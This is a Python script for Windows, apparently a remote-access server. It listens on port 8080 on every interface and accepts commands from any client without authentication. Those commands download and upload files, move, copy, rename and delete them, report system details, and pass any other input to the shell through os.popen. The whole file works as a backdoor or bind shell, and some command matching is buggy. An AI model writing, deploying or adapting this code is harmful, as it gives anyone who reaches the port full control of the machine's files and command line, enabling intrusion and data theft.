import socket
import os
import subprocess
from pathlib import Path
from platform import uname

User = (
    subprocess.run("whoami", stdout=subprocess.PIPE)
    .stdout.decode("utf-8")
    .split("\\")[1]
    .replace("\r\n", "")
)
os.chdir("C:\\Users\\" + User)

print(socket.gethostbyname(socket.gethostname()))
s = socket.socket()
port = 8080  # Change this to the port you wanna use
s.bind(("", port))

print("Listening...")
s.listen(5)

Bytes = 4096

while True:
    c, addr = s.accept()
    print("Got connection from", addr)

    sent = c.recv(Bytes).decode()
    sending = sent

    try:
        if "download" in sent:
            with open(sent.replace("download ", ""), "r") as file:
                sendingName = sent.replace("download ", "").split("\\")
                # sending = file.read()
                sending = (
                    "file: "
                    + sendingName[len(sendingName) - 1]
                    + " : "
                    + "\n".join(file.read().splitlines())
                )
        elif "upload" in sent:
            Name = sent.replace("upload", "").split(" ")[1]
            Contents = sent.replace("upload", "").split(" ", 2)[2]
            with open(Name, "w") as file:
                file.write(Contents)
            sending = "Uploaded Sucessfully."
        elif "[GetDIR]" in sent:
            # print("sending dir")
            sending = "DIR: " + os.getcwd()
        elif sent == "help":
            result = subprocess.run(sent, stdout=subprocess.PIPE)
            sending = result.stdout.decode()
        elif sent == "sysInfo":
            name = uname()
            sending = f"""System: {name.system}\n
            Node Name: {name.node}\n
            Release: {name.release}\n
            Version: {name.version}\n
            Machine: {name.machine}\n
            Processor: {name.processor}""".replace(
                "   ", ""
            )
        elif "print" in sent:
            File = sent.replace("print ", "")
            sending = open(File, "r").read()
        elif "move" in sent:
            unpacked = sent.replace("move ", "").split('"')
            for i in unpacked:
                if i == "" or i == " ":
                    unpacked.remove(i)
            print(unpacked)
            oldDest, File, dest = unpacked
            os.rename(oldDest + "\\" + File, dest + "\\" + File)
            sending = "Moved " + File + " to " + dest
        elif "rename" in sent:
            unpacked = sent.replace("rename ", "").split('"')
            for i in unpacked:
                if i == "" or i == " ":
                    unpacked.remove(i)
            print(unpacked)
            File, newName = unpacked
            os.rename(File, newName)
            sending = "Renamed " + File + " to " + newName
        elif "copy" in sent:
            unpacked = sent.replace("copy ", "").split('"')
            for i in unpacked:
                if i == "" or i == " ":
                    unpacked.remove(i)
            print(unpacked)
            oldDest, File, dest = unpacked
            with open(oldDest + "\\" + File) as r:
                with open(dest + "\\" + File, "w") as f:
                    f.write(r.read())
            sending = "Copied " + File + " to " + dest
        elif "rem" in sent:
            Name = sent.replace("rem ", "")
            if Path.suffix:
                os.remove(Name)
            else:
                os.rmdir(Name)
        elif "mkdir" in sent:
            Name = sent.replace("mkdir ", "")
            os.mkdir(Name)
            sending = "Successfully Made New Directory Named " + Name
        elif "dir" in sent:
            if len(os.listdir()) > 0:
                sending = "\n".join(os.listdir())
            else:
                sending = "EMPTY FOLDER"
        elif "cd" in sent:
            dirToCDTo = sent.replace("cd ", "").replace("{USER}", User)
            os.chdir(dirToCDTo)
            sending = "DIR: " + os.getcwd()
            # print(sending)
        elif "get" in sent:
            sent = sent.replace("get ", "")
            if "size" in sent:
                sent = sent.replace("size ", "")
                sending = str(os.path.getsize(sent))
        elif "set bytes" in sent:
            sent = sent.replace("set bytes ", "")
            print("Setting bytes..")
            sent = sent.replace("bytes ", "")
            Bytes = int(sent)
            sending = "Successfully changed Byte Size."
        else:
            try:
                result = os.popen(sent).read()
                # subprocess.run(sent.split(" "), stdout=subprocess.PIPE)
                sending = result  # .stdout.decode()
            except Exception as e:
                sending = str(e)
    except Exception as e:
        sending = str(e)

    # print(sending)
    c.send(sending.encode())
